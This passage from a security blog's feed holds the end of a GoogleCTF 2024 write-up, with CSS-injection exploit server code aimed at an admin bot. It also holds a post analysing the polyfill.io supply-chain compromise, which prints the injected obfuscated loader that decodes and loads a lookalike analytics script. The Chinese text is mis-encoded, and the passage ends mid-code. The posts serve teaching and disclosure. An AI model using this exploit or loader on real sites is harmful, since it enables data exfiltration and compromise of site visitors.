punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'payload3'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/css'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>payload3<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/payload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">@import url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/payload1");\n@import url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/payload2");\n@import url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/payload3");</span><span class="token template-punctuation string">`</span></span>  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/css'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">sendToBot</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;style>@font-feature-values 'lol; @\\\\0069mport "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/payload";p' &#123;&#125;&lt;/style>&lt;p class="p1">&lt;/p>&lt;p class="p2">&lt;/p>&lt;p class="p3">&lt;/p></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">sendToBot</span><span class="token punctuation">(</span><span class="token parameter">payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://in-the-shadows-web.2024.ctfcompetition.com/share-with-admin?body='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;é€™åŠå¹´å·¦å³å› ç‚ºæœ‰å…¶ä»–äº‹æƒ…åœ¨å¿™ï¼Œæœ‰æ®µæ™‚é–“æ²’æœ‰å¥½å¥½æ‰“ä¸€å ´ CTF äº†ï¼Œé€™æ¬¡ç‚ºäº† GoogleCTF 2024 é¨°å‡ºæ™‚é–“ï¼Œè·ŸéšŠå‹ä¸€èµ·æŠŠæ‰€æœ‰ web éƒ½è§£æ‰äº†ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶å¾Œé¡Œç›®ä¾èˆŠå¾ˆæœ‰è¶£ï¼Œé€™æ¬¡æœ‰ä¸‰é¡Œæœ‰åƒèˆ‡åˆ°ï¼Œå¦å¤–å…©é¡Œæ¯”è¼ƒç°¡å–®çš„éšŠå‹éƒ½å…ˆè§£æ‰äº†ï¼Œæ²’æ©Ÿæœƒçœ‹ï¼Œä½†é‚„æ˜¯æœƒç¨å¾®åšå€‹ç´€éŒ„ã€‚é›£å¾—æœ‰é€™ç¨®å¹¾ä¹éƒ½æ˜¯ client-side challenge çš„ CTFï¼Œæˆ‘æ˜¯æ»¿å–œæ­¡çš„ã€‚&lt;/p&gt;
&lt;p&gt;é—œéµå­—ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;URL parser ç¹é&lt;/li&gt;
&lt;li&gt;parseInt å¾Œé¢å¯ä»¥å¸¶å­—ä¸²&lt;/li&gt;
&lt;li&gt;[a-Z] regex æœƒåŒ…å«ç‰¹æ®Šå­—å…ƒ&lt;/li&gt;
&lt;li&gt;cookie tossing&lt;/li&gt;
&lt;li&gt;CSS injection&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>è«‹å„˜é€Ÿé é›¢ cdn.polyfill.io ä¹‹æƒ¡æ„ç¨‹å¼ç¢¼æ·ºæ</title>
    <link href="https://blog.huli.tw/2024/06/25/stop-using-polyfill-io/"/>
    <id>https://blog.huli.tw/2024/06/25/stop-using-polyfill-io/</id>
    <published>2024-06-25T02:40:00.000Z</published>
    <updated>2024-06-25T12:21:06.863Z</updated>
    
    <content type="html"><![CDATA[<p>Polyfill.io æ˜¯ä¸€å€‹èƒ½å¤ è‡ªå‹•æä¾›å‰ç«¯ polyfill çš„æœå‹™ï¼Œä½¿ç”¨æ–¹æ³•ç›¸ç•¶æ–¹ä¾¿ï¼Œåªéœ€è¦é¸æ“‡æƒ³è¢« polyfill çš„åŠŸèƒ½ï¼Œå†å¼•å…¥ä¸€å€‹ JavaScript æª”æ¡ˆå³å¯ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://polyfill.io/v3/polyfill.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Server ç«¯æœƒè‡ªå‹•æ ¹æ“š user-agent ä¾†åˆ¤æ–·æ˜¯ä¸æ˜¯éœ€è¦å›å‚³ polyfillï¼Œæ‰€ä»¥åªæœƒå¼•å…¥çœŸçš„éœ€è¦çš„ç¨‹å¼ç¢¼ï¼Œè½èµ·ä¾†æ–¹ä¾¿åˆå¥½ç”¨ã€‚</p><p>ä½†é€™å¹¾å¤©æ‡‰è©²æœ‰äººæ”¶åˆ° Google Ads çš„é€šçŸ¥ï¼Œèªªé€™æœ‰ security issueï¼Œé€™åˆæ˜¯çˆ²ä»€éº¼å‘¢ï¼Ÿ</p><span id="more"></span><h2><span id="polyfillio-çš„ç¾æ³">Polyfill.io çš„ç¾æ³</span></h2><p>å¦‚æœè¦è¬›å¾—æ›´ç²¾ç¢ºä¸€é»çš„è©±ï¼Œæœ‰ä¸€å€‹å«åš <a href="https://github.com/polyfillpolyfill/polyfill-service">polyfill-service</a> çš„é–‹æºå°ˆæ¡ˆï¼Œå¯ä»¥åšåˆ°æˆ‘é–‹é ­è¬›çš„äº‹æƒ…ï¼Œä½†ç¾åœ¨å¾ˆå¤šäººéƒ½æ‡¶å¾—è‡ªå·±è·‘ä¸€å€‹æœå‹™ï¼Œå› æ­¤å¯ä»¥å·æ‡¶ç›´æ¥å¼•å…¥ä»–å€‘æä¾›çš„ CDNï¼Œå°±å¯ä»¥äº«æœ‰ç›¸åŒçš„åŠŸèƒ½ã€‚</p><p>ä½†åœ¨ä»Šå¹´ 2 æœˆåº•çš„æ™‚å€™ï¼ŒåŸæœ¬ç”¨ä¾†æä¾›æœå‹™çš„ç¶²åŸŸ <code>cdn.polyfill.io</code> è¢«è³£çµ¦äº†ä¸€é–“ä¸­åœ‹å…¬å¸ï¼Œè€Œå°ˆæ¡ˆçš„é–‹ç™¼è€… @triblondon ä¹Ÿåœ¨æ¨ç‰¹ä¸Šè·³å‡ºä¾†<a href="https://x.com/triblondon/status/1761852117579427975">å‘¼ç±²</a>å¤§å®¶æ‹¿æ‰å° CDN çš„å¼•ç”¨ï¼Œä¸¦ä¸”èªªä»–å¾ä¾†éƒ½æ²’æœ‰é‚£å€‹ domain çš„æ‰€æœ‰æ¬Šï¼š</p><p><img src="/img/stop-using-polyfill-io/p1.png" alt="twitter è²¼æ–‡"></p><p>ä¹Ÿæœ‰äººåšäº†ä¸€å€‹å«åš <a href="https://polykill.io/">Polykill</a> çš„ç¶²ç«™ï¼Œè¬›è¿°äº†äº‹æƒ…çš„ä¾†é¾å»è„ˆã€‚èˆ‡æ­¤åŒæ™‚ï¼ŒçŸ¥åçš„ CDN å» å•† <a href="https://blog.cloudflare.com/polyfill-io-now-available-on-cdnjs-reduce-your-supply-chain-risk?utm_campaign=cf_blog&utm_content=20240229&utm_medium=organic_social&utm_source=twitter">Cloudflare</a> èˆ‡ <a href="https://community.fastly.com/t/new-options-for-polyfill-io-users/2540">Fastly</a> éƒ½æä¾›äº†ä»–å€‘è‡ªå·±çš„ forkï¼Œè®“ä½¿ç”¨è€…æœ‰ç›¸å°ä¾†èªªèƒ½å¤ æ›´å®‰å¿ƒçš„é¸æ“‡ã€‚</p><p>é‚£å¦‚æœæ²’æœ‰é¸é€™äº›ï¼Œç¹¼çºŒç”¨ <code>cdn.polyfill.io</code> çš„è©±æœƒæ€æ¨£å‘¢ï¼Ÿ</p><h2><span id="æƒ¡æ„ç¨‹å¼ç¢¼æ·ºæ">æƒ¡æ„ç¨‹å¼ç¢¼æ·ºæ</span></h2><p>ç­”æ¡ˆæ˜¯ï¼šã€Œåœ¨æŸäº›ç‹€æ³ä¸‹ï¼Œç¶²ç«™çš„ä½¿ç”¨è€…æœƒæ‹¿åˆ°ä¸€å€‹è¢«åŠ æ–™çš„ JavaScriptã€ã€‚</p><p>é€™æ˜¯ç¾åœ¨é€²è¡Œå¼ï¼Œæˆ‘ä»Šå¤©æ‰å‰›é‡ç¾å‡ºä¾†ã€‚</p><p>åœ¨ GitHub ä¸Šæœ‰ä¸€å€‹ issueï¼š<a href="https://github.com/polyfillpolyfill/polyfill-service/issues/2873">polyfill.io domain owner #2873</a> åœ¨è¨è«–é€™ä»¶äº‹ï¼Œåœ¨ç•™è¨€è™•æœ‰ç¶²å‹ @alitonium æä¾›äº†å¯ä»¥é‡ç¾çš„æ­¥é©Ÿï¼ŒåŒ…æ‹¬ï¼š</p><ol><li>å—å½±éŸ¿çš„ç¶²å€</li><li>æœ‰æ•ˆçš„ user-agent</li><li>è¦å¸¶ Referer</li></ol><p>åœ¨æ»¿è¶³äº†ä¸€äº›æ¢ä»¶ä¹‹å¾Œï¼Œå°±èƒ½å¤ çœ‹åˆ°è¢«åŠ æ–™çš„å›æ‡‰ã€‚</p><p>æˆ‘ä»Šå¤©ç¨å¾®è©¦äº†ä¸€ä¸‹ï¼Œé€™æ˜¯ä¸€èˆ¬çš„å›æ‡‰ï¼Œå°±æ˜¯å›å‚³æ­£å¸¸çš„ polyfill è€Œå·²ï¼š</p><p><img src="/img/stop-using-polyfill-io/p2.png" alt="æ­£å¸¸çš„ response"></p><p>è€Œåº•ä¸‹æ˜¯æœ‰è¢«åŠ æ–™çš„ï¼š</p><p><img src="/img/stop-using-polyfill-io/p3.png" alt="æœ‰æ¯’çš„ response"></p><p>å¾ˆæ˜é¡¯å¯ä»¥çœ‹å‡ºå¾Œé¢å¤šäº†ä¸€æ®µç¨‹å¼ç¢¼ã€‚</p><p>å¦‚æœæƒ³è‡ªå·±è©¦è©¦çœ‹çš„è©±ï¼Œæˆ‘çš„ user-agent å¸¶çš„æ˜¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">Mozilla&#x2F;7.48 (iPhone15,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit&#x2F;602.1.50 (KHTML, like Gecko) Version&#x2F;10.0 Mobile&#x2F;15E148 Safari&#x2F;602.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‰é¢é‚£å€‹ <code>Mozilla/7.48</code> çš„æ•¸å­—å¯ä»¥äº‚æ”¹ï¼Œç„¶å¾Œå› ç‚º GitHub ä¸Šçš„è©•è«–èªªä¸€å€‹ IP ä¼¼ä¹åªæœƒä¸­ä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘å˜—è©¦ç”¨ <code>X-Forwared-For</code> å½é€  IPï¼Œç™¼ç¾ä¼¼ä¹æœ‰æ•ˆï¼Œç®—æ˜¯ä¸€ç¨®ä»¥æ¯’æ”»æ¯’å—ï¼Ÿ</p><p>ç¸½ä¹‹å‘¢ï¼ŒIP å¤šæ›å¹¾æ¬¡ï¼Œuser-agent ä¹Ÿå¤šæ›å¹¾æ¬¡ä¹‹å¾Œæ‡‰è©²å°±èƒ½è©¦å‡ºä¾†ã€‚</p><p>é‚£å¾Œé¢åŠ æ–™çš„é‚£æ®µç¨‹å¼ç¢¼æœƒåšä»€éº¼ï¼Ÿå…§å®¹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">MqMqY</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span>    n <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> c1 <span class="token operator">=</span> c2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>      n<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> <span class="token number">191</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">&lt;</span> <span class="token number">224</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      c2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      n <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      c2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      c3 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c3 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      n <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">HHwbhL</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> m <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span>    n<span class="token punctuation">,</span>    r<span class="token punctuation">,</span>    i<span class="token punctuation">,</span>    s<span class="token punctuation">,</span>    o<span class="token punctuation">,</span>    u<span class="token punctuation">,</span>    a<span class="token punctuation">,</span>    f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  e <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[^A-Za-z0-9+/=]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    s <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    o <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    u <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    n <span class="token operator">=</span> <span class="token punctuation">(</span>s <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>o <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    r <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>o <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>u <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> a<span class="token punctuation">;</span>    t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>u <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">MqMqY</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"window"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"klodTq"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">u<span class="token punctuation">,</span> r<span class="token punctuation">,</span> w<span class="token punctuation">,</span> d<span class="token punctuation">,</span> f<span class="token punctuation">,</span> c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> x <span class="token operator">=</span> HHwbhL<span class="token punctuation">;</span>    u <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>u<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>c <span class="token operator">+</span> <span class="token string">""</span> <span class="token operator">+</span> c<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token string">"jQuery"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k <span class="token operator">=</span> r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span> f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token string">"Flex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v <span class="token operator">=</span> k <span class="token operator">+</span> f<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> s <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>v <span class="token operator">+</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token function-variable function">g</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    s<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">"text/javascript"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#123;</span>      s<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    s<span class="token punctuation">.</span>src <span class="token operator">=</span> u<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token string">"CSS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    d<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>    <span class="token string">"aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM="</span><span class="token punctuation">,</span>    <span class="token string">"gUssQxWzjLAD"</span><span class="token punctuation">,</span>    window<span class="token punctuation">,</span>    document<span class="token punctuation">,</span>    <span class="token string">"DrPdgDiahyku"</span><span class="token punctuation">,</span>    <span class="token string">"ptsrhUDHCv"</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>  <span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^Mac|Win</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>  document<span class="token punctuation">.</span>referrer<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span 